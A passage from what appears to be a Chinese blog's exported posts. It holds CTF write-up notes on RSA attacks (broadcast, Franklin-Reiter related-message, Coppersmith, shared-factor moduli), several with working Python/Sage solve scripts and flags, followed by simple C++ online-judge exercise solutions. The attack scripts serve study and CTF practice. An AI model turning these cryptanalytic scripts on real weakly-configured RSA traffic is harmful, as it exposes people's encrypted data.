n=[17551188754807399016342420221734945766749930201727412345251590531404061480740932995199065332987719183197199448336435851015540272155441486746027315107821340969105623451575872580170978368650593880274076025520453956378539766228430429142117994616985318963125739076826635459215114946159348678398268099389525414431618517743889314085714390430972783223270985688988995257770363117225472590084489120958397189130958462784532637453482182763505791720641422686749616216521724012108378680177131928438795893866425040489551258902610047574579899692834984999209528110849342042529825594061894238371591910354584305136154355365191215400149,21840437284422601584177601857355845296420300157767339109572377640408362726674561246210400400760474187121246893712480109326893614162779470768415282900713800983815570602250068673695044749932532689851310770087552524620857623442019428044482787965428075984951982104920901562456426672111590909100736209153905853035127247720276974050404663847547090362780729077829594684995979457326414947449083219461617302643392904522733812903141301332227357689517880801845510579518887472928083718826890369016944549160461428710615747001273521253638766267143341819170249648385341127263707417642925464809788975715332938666417316695941347477577,30015914133986758133105015082922460910471726819000479872816812806794140887209294393963063273377891203069864711466776200108173672428779293308320460116493040572826915020654293929241843686728296387400110062099074573009645563520805301899962344680821396200256042478539540675850427377958553324581371362112652752444824919601767821622038488365501031636558236126052654241662743070651213369566898998898634441261811655053789384588711547685939927721116404429914329081432990913321296964957260691148704710581681774562904924080813274984809940008968629515304859518629473284018332651831587916402539386242421630250537030688162675751761,18009718435825445649372629634867772247035138229493108362713630947680338354227735572070882390378632440365163117094233413520107070581908224239210969172094402760924055334584259678276505919418191623762998249724248379302786621689049107500760348303940112840664926231345646325964133281550765454719628161600475143792567309947330130747860125557547051843620899629217636918002929846463097841539446014019579830347356084080488561917440356848465812937246809018168582635191619622041079012450531811237168105634382108634135880887093525611263186925213027913337454706919754923593714509998062073450679720905569489304398625255143801533277,27090736422393991189249636552945539144039087911497773160371557650625344533254580764344628540515132884576739746597729079146155130899009238110101654711303800340566538298798432929136509923129089904647023409146264405964139002638684510681372633714179570768685640570209727600215295330846361754314973731753734397312932947433225732597524076563605729037998272803472953079912899867244318073144564355326520230078681106746670895643454939714423661018216469020021429142336238301775948794784776906058601395026463842070755547793192470653204078222827768950823747061655106900276571547680451953562314376913592896427730473091360051391129,22277916445389799876692954866506052125036892596099795492064670519272419621528759837318253665292779127861537748967309681231938516330289846519214661138299205082421968922350230121526530080908053297879027158545040193774647350499415863211113776785399848472712293535289113810322398103983587423306282629848367328743089145940536913390664697321526306054579656600439140061667264516070003507841618352122567379038304294976725469305215682426898731699093794930417366769249256999177339843020364367769712776225743916112170787273891225926246407201080202593858063362565931942590349178361085396799890148505959437244983447934838792051793,20851005254704933958354817552975190588383962843827122226904964048318053243049822277049715505735762051530592940514007687138882551369906711787133432792478447465241409449145625470766867280545673313710877827491010966285871747638401315338616986782370641881615238434667687936400955629642629748987839996011550408156162317201139746453148874558603034756902297066835592748562014100033050736650359512497633206350878620421058840864178654150287452573363251543090733404389037241843869379543719804499640600546216051812575335078292203435075056740907356476508423562893159958041443951220933694064510275964264723600894558623421819904501,21745680718194037861694569863678082853797244380310200176477643943644972463871360669070584682807703870684830948023158889780219716829353665600564791257912082043905122048004593803193375178269942973208249276102769671038752489438400731535367257356207098737711096953679231300720903502192144476519811856646400822239966219746455729409375771797064825552958482297097797911599808242875799342438899636328763766908154658738969614707377852147843953614178305416594819846812426828300689497046389665982817209315784313108617753052015326937047712513569322963102500122038505770232917473260057408981125469607573191926134043719437868156273,23257483042331781031320004066395973098539881870433034498180628292164825476845647596122889756396987220787263478778647199033523248861079487991256044473644515960559630792146394039814096408486541588067643811077716428015000310006227815563853161604153799667073262886506475792902392829571472354691875108497532721686076971371510238161060553858839091026451266521753830084143245517459861325880906431205328541736948784727909518259034781432825317588016829248046749554245422672923121452470552323438808591118050034108325754535134236727740460190849252647561826203675666601441506024780605194340777802389960180532831878689458096046821,27637004622327338030988157906180324667829916751358977640832765328645718696385482091781513197472066052101704131751158627239657425473994441143385613105528200215275110466263289952962400664293602133856809475295970322767309563273999319926150648399522508592521685688896842833243324070987594588134776515978198364901455727292006058624015674914131447232032058875410956114939938460192876157612457774033922125553271809409381181134668696682847583314698759337802814876161751333701826176655372126746717533228292189928645064111959824895679517476699556313948724818860906006774808944802984477517788391260149504822396276593451707118257]

c=[4675182605549711347653299514777826238559040200527747810846901991433127025723361807211672208052862870258047285285949212515664278410499603829663266213968511493974766674071825225536665267049044619340378438531615983696406305841945756396579371794826265549929503043134668360055027276522368879193620937457881486509311711905722483187734650127796510808637890189952840971330768913946884525594627652458745930532219238258911608744112001798136394806004726472890838481881026716605743812674350955258003794590748258523929460446986020794445478076559635145181909093786617716473870604463315696183050495143502762614767485881979217577416,4586033930015814975553487614321341290358072960539564849589758593801587823414394351862074093343255479635303199078561905260793645869942622136164615776822867275172888812989071016687658023005838776181437470204528335444413852561895603377955959308318399246963213964044984235974352824060625970587119586612774322385216810264819426458641852166009899106655036755913322283219739741020656812034348404092018340277026844114272699170323014050087289715403989671918767712613414346320222745328800096615947138667139053339483278319521201983885423491905171167675501563556563890821756892474999549635650486944010346554641603343238490572689,12012575342366442210994368605032582129674485327006093552902983877957202172783938071684841031902396156899396879136388606996807608296316795628987877357547213450360953742947781700549506469226564975927361748596520878542651668963131021269851928174681007347771519569914690980744941965086762285630082781013781879511681353119117280354102271439057204066405072328422057721895983540492150402309552609035008272366176657384174081229798739099558539083074489500359062010164358300087124447037922844709870430218019673914305742939927888838599616520300011913022792060392260618046807788302643742874847024153198113792628046678578753632923,4249005911324898630458723491151576810198619078332972911420166645127258598519950448507640904379342817486426262054889199369385257812524759761245588973651578211291344326619317559377360319507727729535083143293335799588196976241949218037833747839545295030259115279668065886560417877204054684495047181117075603468672292268831273735956964067626837975218539840667641885621426607941950306330198897187683754687379611844278471572791816397950634388907233312117920634807989734011132718334334850592111651631323130933438007008983489782601827321396168104668493332626558911838721998173148508994771473224050827471186478106896949413831,18557109853898405974924769550105345673703067457537813607252151469933140760798378574244439559372100428971400070351173140348823652755825601433268832363575896137364288069984314151346137206115518309597389268875150549696376813277778514591532615794294637044626683931367510181612383681914421702261592233265455950023252407680604041046629667703207133146853618989187597749132650514038584280417791134426596848369417626039533740827554552117727501565841065077835398951826747855393552731497438983274201599740189743630949174610722118659019630964669901438690028070213710833335622573526403588737092869273969581607637522572757015237506,19221531342713801219971420455098666365124810169512711030444063942333694562364114172361552139176582476168134219937393468391346535097965763785916484012657401095066804857900941482772687159471483908107669892419626059680168762119954068288719303591498504050604628627299671160225276355636519961578118413913001058744164531470610279168723402009469959377794138715204862239973561494796213624769358906726186769711689962808937828553399403173762034548974335960107700638910231658795639167906700770120741974418495196827830462542130080965552102416180517600397897065113788279096066792533807104187868678848857780735334749865813019681909,2043866718532927301454127017521835945401727173760352488220517028498861777262807036566165189285730569375083406234212921588654098421290088269551352101830688429903600880691046607902396566775005694148315605616437713115424223594710186677844867273218443350479253279231960061845711898262461185970057002138523262952260834191169438764964758526877361442277664448596129451496415695776781879266732057920583336999766633938582656240607973759756021032489262381190762825081392613689817792764844409877116240223852376311404164963595040347176139494461319495285348608562589901671620063620688524249523700500144604558899272202564535295466,9018406452041117867927204674649220929160509942604290572303644183451237944912470236367308266319079349289625873447647200474598755869642999213142758825809522474810817609751187533346902667225032452694187162262683056445775455963994237202296104812386374636270188433521927503415507963477240913270879794141170568393025367891003921090015993944946205723601349149601256727433716155121883420271498265967234259068535172501445643752691860997480636101699340740265505767091920668218018002976632111256430655619061247292025654740889077014179258647084698229733160071306390020603636210736363198302407289195286953980520285032528614492926,17978671919734595201524186618868659656036765546673883938819333911564948587858876495802600244078413312462813938682090761599961604959609423010904187720748539707172853352540370208991902929002036775381503365170196838626379685712050728875172622632447875368166743751159775611642629408534890684109652648484868876710697249351895355111511281037497347712241242908563699707272843032773107477368790419109907271096351457526240471975122296483655337150130000812813081239181653384419149292970320991892073352340649237387406498087734708162094476092368665794350968924289259192893289337038201504066310173284757044802449600666007821509553,8597067880812456123669594978660135058668875834924201279924162761020137582662367704504988576614934966062323191666982943113656186783894245035267051756178331490881264629774635620179678000947771928854566239213498586078670870127924696459041295848474073879336501325437194563845414699360564571136683492426292766799121155041276162673427700999761055592609213603158576637212003771003996722743170543342885011289692845493598413965688949325670519743413071479057382602222055902593614159427186017797992219490308930116850084553033461316509457834436420821916094206010206229370273622681413176347187252950087428868295965528772832409316]

data=[]
for i in range(len(c)):
    data += [(c[i],n[i])]
x, n = chinese_remainder_theorem(data)
realnum = gmpy.mpz(x).root(e)[0].digits()
print my_parse_number(int(realnum))</code></pre>
<h3 id="Broadcast-Attack-with-Linear-Padding"><a href="#Broadcast-Attack-with-Linear-Padding" class="headerlink" title="Broadcast Attack with Linear Padding"></a>Broadcast Attack with Linear Padding</h3><blockquote>
<p><a href="https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Generalizations">https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Generalizations</a></p>
</blockquote>
<h3 id="Related-Message-Attack"><a href="#Related-Message-Attack" class="headerlink" title="Related Message Attack"></a>Related Message Attack</h3><blockquote>
<p>先引用ctf-wiki的解释，等完全理解了再编辑</p>
</blockquote>
<p><strong>条件：</strong></p>
<p>当 Alice 使用同一公钥对两个具有某种线性关系的消息 M1 与 M2 进行加密，并将加密后的消息 C1，C2 发送给了 Bob 时，我们就可能可以获得对应的消息 M1 与 M2。这里我们假设模数为 N，两者之间的线性关系如下</p>
<p>$$ M_1 \equiv f(M_2) \bmod N $$</p>
<p>其中 f 为一个线性函数，比如说 $f=ax+b$。</p>
<p>在具有较小错误概率下的情况下，其复杂度为 $O(elog^2N)$。</p>
<p>这一攻击由 Franklin，Reiter 提出。</p>
<p><strong>原理：</strong></p>
<p>首先，我们知道 $C_1 \equiv M_1 ^e \bmod N$，并且 $M_1 \equiv f(M_2) \bmod N$，那么我们可以知道 $M_2$ 是 $f(x)^e \equiv C_1 \bmod N$ 的一个解，即它是方程 $f(x)^e-C_1$ 在模 N 意义下的一个根。同样的，$M_2$ 是 $x^e - C_2$ 在模 N 意义下的一个根。所以说 $x-M_2$ 同时整除以上两个多项式。因此，我们可以求得两个多项式的最大公因子，如果最大公因子恰好是线性的话，那么我们就求得了 $M_2$。需要注意的是，在 $e=3$ 的情况下，最大公因子一定是线性的。</p>
<p>这里我们关注一下 $e=3$，且 $f(x)=ax+b$ 的情况。首先我们有</p>
<p>$$ C_1 \equiv M_1 ^3 \bmod N,M_1 \equiv aM_2+b \bmod N $$</p>
<p>那么我们有</p>
<p>$$ C_1 \equiv (aM_2+b)^3 \bmod N,C_2 \equiv M_2^3 \bmod N $$</p>
<p>我们需要明确一下我们想要得到的是消息 m，所以需要将其单独构造出来。</p>
<p>首先，我们有式 1</p>
<p>$$ (aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3 $$</p>
<p>再者我们构造如下式 2</p>
<p>$$ (aM_2)^3-b^3 \equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \bmod N $$</p>
<p>根据式 1 我们有</p>
<p>$$ a^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \equiv C_1 \bmod N $$</p>
<p>继而我们有式 3</p>
<p>$$ 3b(a^2M_2^2+aM_2b+b^2) \equiv C_1-a^3C_2+2b^3 \bmod N $$</p>
<p>那么我们根据式 2 与式 3 可得</p>
<p>$$ (a^3C_2-b^3)*3b \equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \bmod N $$</p>
<p>进而我们有</p>
<p>$$ aM_2-b=\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3} $$</p>
<p>进而</p>
<p>$$ aM_2\equiv \frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3} $$</p>
<p>进而</p>
<p>$$ M_2 \equiv\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\frac{b}{a}\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3} $$</p>
<p>上面的式子中右边所有的内容都是已知的内容，所以我们可以直接获取对应的消息。</p>
<p>有兴趣的可以进一步阅读 <a href="https://www.iacr.org/archive/pkc2005/33860001/33860001.pdf">A New Related Message Attack on RSA</a> 以及 <a href="https://www.cs.unc.edu/~reiter/papers/1996/Eurocrypt.pdf">paper</a> 这里暂不做过多的讲解。</p>
<p><strong>题目：</strong></p>
<p>这里我们以 SCTF RSA3 中的 level3 为例进行介绍。首先，跟踪 TCP 流可以知道，加密方式是将明文加上用户的 user id 进行加密，而且还存在多组。这里我们选择第 0 组和第 9 组，他们的模数一样，解密脚本如下</p>
<pre><code class="python">import gmpy2
id1 = 1002
id2 = 2614

c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718L
c2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08L
n = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553
a = 1
b = id1 - id2


def getmessage(a, b, c1, c2, n):
    b3 = gmpy2.powmod(b, 3, n)
    part1 = b * (c1 + 2 * c2 - b3) % n
    part2 = a * (c1 - c2 + 2 * b3) % n
    part2 = gmpy2.invert(part2, n)
    return part1 * part2 % n


message = getmessage(a, b, c1, c2, n) - id2
message = hex(message)[2:]
if len(message) % 2 != 0:
    message = &#39;0&#39; + message

print message.decode(&#39;hex&#39;)</code></pre>
<p>当然，我们也可以直接使用 sage 来做，会更加简单一点。</p>
<pre><code class="python">import binascii

def attack(c1, c2, b, e, n):
    PR.&lt;x&gt;=PolynomialRing(Zmod(n))
    g1 = x^e - c1
    g2 = (x+b)^e - c2

    def gcd(g1, g2):
        while g2:
            g1, g2 = g2, g1 % g2
        return g1.monic()
    return -gcd(g1, g2)[0]

c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718L
c2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08L
n = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553
e=3
a = 1
id1 = 1002
id2 = 2614
b = id2 - id1
m1 = attack(c1,c2, b,e,n)
print binascii.unhexlify(&quot;%x&quot; % int(m1 - id1))</code></pre>
<h3 id="Coppersmith’s-short-pad-attack"><a href="#Coppersmith’s-short-pad-attack" class="headerlink" title="Coppersmith’s short-pad attack"></a>Coppersmith’s short-pad attack</h3><p>过短的padding长度导致的容易攻击</p>
<h3 id="Known-High-Bits-Message-Attack（Stereotyped-messages）"><a href="#Known-High-Bits-Message-Attack（Stereotyped-messages）" class="headerlink" title="Known High Bits Message Attack（Stereotyped messages）"></a>Known High Bits Message Attack（Stereotyped messages）</h3><p><strong>条件：</strong>知道了消息m的很大一部分$m_0$</p>
<p>现在，$c=(m_0+x)^e\mod n$，也就是$f(x)=(m + x)^e - c$有一个解满足$f(x)=k\cdot N(k=0,1,2\cdots)$,求解x。</p>
<p>依据oppersmith定理是可以求出剩下的所有明文部分。</p>
<pre><code class="python">dd = f.degree()
beta = 1
epsilon = beta / 7
mm = ceil(beta**2 / (dd * epsilon))
tt = floor(dd * mm * ((1/beta) - 1))
XX = ceil(N**((beta**2/dd) - epsilon))
roots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX)</code></pre>
<blockquote>
<p><a href="https://github.com/mimoo/RSA-and-LLL-attacks">https://github.com/mimoo/RSA-and-LLL-attacks</a></p>
</blockquote>
<h3 id="Factoring-with-high-bits-known"><a href="#Factoring-with-high-bits-known" class="headerlink" title="Factoring with high bits known"></a>Factoring with high bits known</h3><p><strong>条件：</strong>知道一个公钥中模数 N 的一个因子的较高位时</p>
<h3 id="模不互素"><a href="#模不互素" class="headerlink" title="模不互素"></a>模不互素</h3><p><strong>条件：</strong>两个公钥的 N 不互素</p>
<p><strong>原理：</strong>题目给出了两个或多个N,e或公钥，两个N如果不互素那么我们可以比较容易的找到他们的最大公因数，然后就得到p，q了，进而可以求出私钥进行解密了。</p>
<pre><code class="python">import gmpy2
import libnum

n1 = input(&quot;n1:&quot;)
n2 = input(&quot;n2:&quot;)

p1 = gmpy2.gcd(n1, n2)
q1 = n1 / p1

e = input(&quot;e:&quot;)
phin = (p1 - 1) * (q1 - 1)
d = gmpy2.invert(e, phin)
cipher = input(&quot;c:&quot;)

plain = gmpy2.powmod(cipher, d, n1)
flag = libnum.n2s(plain)
print flag</code></pre>
<p><strong>例题：</strong>（SCTF RSA2）</p>
<p>在给的数据包中有10 个含数据的报文，每个格式如下：</p>
<pre><code>Please send your public key, then We will use your public key to encrypt int(level5.passwd.encode(&#39;hex&#39;), 16), finally, we send the ciphertext to you.

We have got N is ......
e is ......
encrypted messages is 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7</code></pre>
<p>给了十组n,e,c，前两组的n就不互素，采用该攻击求出p,q，解密得到flag。</p>
<pre><code class="python">~python exp.py
n1:20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031
n2:19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943
e:65537
c:0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7
sH1R3_PRlME_1N_rsA_iS_4ulnEra5le</code></pre>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>加解密</tag>
      </tags>
  </entry>
  <entry>
    <title>C++题目（OJ）</title>
    <url>/2017/05/04/c-ti-mu-oj/</url>
    <content><![CDATA[<h3 id="1-数组类（1）"><a href="#1-数组类（1）" class="headerlink" title="1.数组类（1）"></a>1.数组类（1）</h3><blockquote>
<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>封装一个整型数组类，用于存储整数和处理的相关功能，支持以下操作：</p>
<ol>
<li>Array::Array()无参构造方法：创建一个空数组对象。</li>
<li>Array::size()方法：返回Array对象中元素个数。</li>
<li>Array::get(int n)方法：按格式从输入读取n元素。</li>
<li>下标运算符：返回下标所指的元素。</li>
</ol>
<p>-—————————————————————————-</p>
<p>你设计一个数组类Array，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数</p>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据。</p>
<p>后面的每行以一个整数k开头，表示后面有k个整数。</p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>把输入的数组，输出出来。每行数据对应一个输出。格式见sample。</p>
<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4 </p>
<p>2 10 20 </p>
<p>1 0</p>
<p> 0</p>
<p> 3 1 2 3</p>
<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>10 20</p>
<p> 0 </p>
<p>1 2 3</p>
<h2 id="HINT"><a href="#HINT" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code"><a href="#Append-Code" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1572&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;vector&gt;
using namespace std;
class Array&#123;
private:
    vector&lt;int&gt; arr;
    int l;
public:
    Array()&#123;l=0;&#125;
    int size()&#123;return arr.size();&#125;
    void get(int n)&#123;
        arr.resize(n);
        l=n;
        for(int i=0;i&lt;l;i++)&#123;
            int m;
            cin &gt;&gt; m;
            arr[i]=m;
        &#125;
    &#125;
    int operator[](int n)&#123;return arr[n];&#125;
&#125;;
/////////////////////////////////////
int main()
&#123;
    int cases;
    Array arr;
    cin &gt;&gt; cases;
    for(int ca = 1; ca &lt;= cases; ca++)
    &#123;
        int len;
        cin &gt;&gt; len;
        arr.get(len);
        for(int i = 0; i &lt; arr.size(); i++)
            if(i + 1 == arr.size())
                cout &lt;&lt; arr[i];
            else
                cout &lt;&lt; arr[i] &lt;&lt; &quot; &quot;;
        cout &lt;&lt; endl;
    &#125;
&#125;</code></pre>
<blockquote>
<p>详细的函数实现功能：其中vector<int> c.</p>
<p>​                             c.clear()         移除容器中所有数据。</p>
<p>​                             c.empty()         判断容器是否为空。</p>
<p>​                             c.erase(pos)        删除pos位置的数据</p>
<p>​                             c.erase(beg,end) 删除[beg,end)区间的数据</p>
<p>​                             c.front()         传回第一个数据。</p>
<p>​                             c.insert(pos,elem)  在pos位置插入一个elem拷贝</p>
<p>​                             c.pop_back()     删除最后一个数据。</p>
<p>​                             c.push_back(elem) 在尾部加入一个数据。</p>
<p>​                             c.resize(num)     重新设置该容器的大小</p>
<p>​                             c.size()         回容器中实际数据的个数。</p>
<p>​                             c.begin()           返回指向容器第一个元素的迭代器</p>
<p>​                             c.end()             返回指向容器最后一个元素的迭代器</p>
</blockquote>
<p><a href="http://blog.csdn.net/hancunai0017/article/details/7032383">vector用法</a></p>
<h3 id="2-Base与Derived"><a href="#2-Base与Derived" class="headerlink" title="2.Base与Derived"></a>2.Base与Derived</h3><blockquote>
<h2 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h2><p>定义Base和Derived类，Derived类是Base类的子类，两个类都只有1个int类型的属性。定义它们的构造函数和析构函数，输出信息如样例所示。</p>
<h2 id="Input-1"><a href="#Input-1" class="headerlink" title="Input"></a>Input</h2><p>输入2个整数。</p>
<h2 id="Output-1"><a href="#Output-1" class="headerlink" title="Output"></a>Output</h2><p>见样例。</p>
<h2 id="Sample-Input-1"><a href="#Sample-Input-1" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>100</p>
<p>200</p>
<h2 id="Sample-Output-1"><a href="#Sample-Output-1" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Base 100 is created.</p>
<p>Base 100 is created.</p>
<p>Derived 200 is created.</p>
<p>Derived 200 is created.</p>
<p>Base 100 is created.</p>
<p>Base 100 is created.</p>
<h2 id="HINT-1"><a href="#HINT-1" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-1"><a href="#Append-Code-1" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=2074&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Base&#123;
public:
    int a;
    Base(int aa):a(aa)&#123;cout &lt;&lt; &quot;Base &quot; &lt;&lt; a &lt;&lt; &quot; is created.&quot; &lt;&lt; endl;&#125;
    ~Base()&#123;cout &lt;&lt; &quot;Base &quot; &lt;&lt; a &lt;&lt; &quot; is created.&quot; &lt;&lt; endl;&#125;
&#125;;
class Derived: public Base&#123;
public:
    int b;
    Derived(int aa,int bb):Base(aa),b(bb)&#123;cout &lt;&lt; &quot;Derived &quot; &lt;&lt; a &lt;&lt; &quot; is created.&quot; &lt;&lt; endl;&#125;
    ~Derived()&#123;cout &lt;&lt; &quot;Derived &quot; &lt;&lt; a &lt;&lt; &quot; is created.&quot; &lt;&lt; endl;&#125;
&#125;;
int main()
&#123;
    int a, b;
    cin&gt;&gt;a&gt;&gt;b;
    Base base(a);
    Derived derived(a, b);
    return 0;
&#125;</code></pre>
<h3 id="3-编写函数：三个数的最大最小值-Append-Code"><a href="#3-编写函数：三个数的最大最小值-Append-Code" class="headerlink" title="3.编写函数：三个数的最大最小值 (Append Code)"></a>3.编写函数：三个数的最大最小值 (Append Code)</h3><blockquote>
<h2 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h2><p>给出三个数a,b,c，最大值是？最小值是？</p>
<p>-—————————————————————————-</p>
<p>编写以下两个函数：</p>
<p>get_num()的功能是读取输入的三个整数a,b,c；</p>
<p>max_min()的功能是求出a,b,c的最大值和最小值。</p>
<p>以上函数的调用格式见“Append Code”。这里不给出函数原型，请通过main()函数自行确定。</p>
<h2 id="Input-2"><a href="#Input-2" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据，每组3个整数：a,b,c。a,b,c都在int类型范围内。</p>
<h2 id="Output-2"><a href="#Output-2" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应输出一行：为a,b,c的最大值和最小值，格式见sample。</p>
<h2 id="Sample-Input-2"><a href="#Sample-Input-2" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>5</p>
<p>20 15 10</p>
<p>10 15 20</p>
<p>100 100 0</p>
<p>0 1 -1</p>
<p>0 0 0</p>
<h2 id="Sample-Output-2"><a href="#Sample-Output-2" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>case 1 : 20, 10</p>
<p>case 2 : 20, 10</p>
<p>case 3 : 100, 0</p>
<p>case 4 : 1, -1</p>
<p>case 5 : 0, 0</p>
<h2 id="HINT-2"><a href="#HINT-2" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-2"><a href="#Append-Code-2" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=0&pid=1382&getkey=">append.c</a>, <a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1382&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
void get_num(int &amp;a,int &amp;b,int &amp;c)&#123;
    cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;
&#125;
void max_min(int &amp;mmax,int &amp;mmin,int &amp;a,int &amp;b,int &amp;c)&#123;
    mmax = a;
    mmin = a;
    if(b &gt; mmax)
        mmax = b;  
    if(b &lt; mmin)
        mmin = b;
    if(c &gt; mmax)
        mmax = c;
    if(c &lt; mmin)
        mmin = c;
&#125;
////////////////////////////
int main()
&#123;
    int cases;
    int mmax, mmin, a, b, c;

    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        get_num(a, b, c);
        max_min(mmax, mmin, a, b, c);
        cout&lt;&lt;&quot;case &quot;&lt;&lt;i&lt;&lt;&quot; : &quot;&lt;&lt;mmax&lt;&lt;&quot;, &quot;&lt;&lt;mmin&lt;&lt;endl;
    &#125;
&#125;
